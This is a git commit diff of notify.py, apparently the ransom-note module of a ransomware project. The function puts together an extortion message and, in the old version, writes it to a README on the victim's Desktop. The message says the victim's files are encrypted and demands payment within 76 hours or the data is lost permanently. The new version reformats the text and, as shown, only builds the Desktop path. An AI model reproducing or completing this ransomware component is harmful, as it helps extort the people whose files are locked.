0cc0fc7c738afad127391f4e93bda950d71d8815
max76cuz <mkingston25@knox.nsw.edu.au>
2025-02-13 13:41:56 +1100

    Update notify.py

--- notify.py
+++ notify.py
@@ -1,18 +1,16 @@
 import os
 
 def notify():
-	message='''What do lahd!!!
+    message = """What do lahd!!!
 
-Your documents, photos, databases and other important files have been encrypted cuzzy. Your files are encrypted by PSMF with the use of our powerful EMA. A unique key has been generated to decrypt your files.
+Your documents, photos, databases, and other important files have been encrypted, cuzzy. Your files are locked by PSMF using our powerful EMA encryption. A unique key has been generated to decrypt your files.
 
-Private decryption key is stored on a secret server and the files cannot be decrypted without the key. You will get only receive the private key, if you make the payment to PSMF.
+The private decryption key is stored on a secret server, and your files **cannot** be decrypted without it. You will only receive the private key **if** you make the payment to PSMF.
 
-You have 76 hours to submit the payment. If you do not send the money within the specified time your data will permenently be encrypted and nobody will be able to decrypt them. Ontday uckfay rounday adlay. 
-'''
+You have **76 hours** to submit the payment. If you do not send the money within the specified time, your data will be **permanently encrypted**, and nobody will be able to recover it. **Don't mess around, lad.**
 
-	desktop=os.getenv('HOME')+"/Desktop/"
-	messagefile=desktop+"README"
+"""
 
-	mfile=open(messagefile,'w')
-	mfile.write(message)
-	mfile.close()
+    # Get the desktop path dynamically
+    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
+    message_file = os.path.join(desktop, "README.md")
